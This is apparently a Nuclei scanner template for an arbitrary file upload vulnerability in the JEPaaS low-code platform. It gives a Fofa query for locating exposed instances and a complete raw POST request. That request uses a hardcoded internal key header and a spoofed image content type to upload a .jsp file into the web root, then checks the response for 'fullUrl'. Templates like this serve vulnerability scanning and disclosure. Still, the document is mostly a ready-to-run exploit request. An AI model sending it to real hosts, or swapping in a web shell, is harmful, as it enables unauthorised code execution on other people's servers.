id: JEPaaS_Document_Fileupload

info:
  name: JEPaaS_Document_Fileupload
  author: HK
  severity: high
  description: JEPaaS低代码平台/je/document/file接口存在任意文件上传漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/static/ux/babel-polyfill/polyfill.min.js"
    verified: true

http:
- raw:
  - "@timeout: 30s\nPOST /je/document/file?bucket=webroot HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:
    Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\nAccept:
    application/json, text/javascript, */*; q=0.01\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,\ninternalRequestKey:
    schedule_898901212\nContent-Type: multipart/form-data; boundary=----21909179191068471382830692394\nConnection:
    close\nContent-Length: 174\n\n------21909179191068471382830692394\nContent-Disposition:
    form-data; name=\"files\"; filename=\"111.jsp\"\nContent-Type: image/jpeg\n \n123\n------21909179191068471382830692394--"

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - fullUrl
